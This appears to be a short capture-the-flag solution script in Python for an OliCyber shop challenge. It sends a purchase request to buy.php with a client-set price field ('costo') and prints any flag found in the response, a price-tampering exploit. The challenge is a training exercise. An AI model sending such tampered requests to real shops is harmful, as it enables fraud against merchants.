import requests

url = 'http://shops.challs.olicyber.it/buy.php'
payload = {"id":"2", "costo":"69"}

r = requests.post(url, data=payload).text

for i in r.split():
    if "flag{" in i.lower():
        print(i)
        
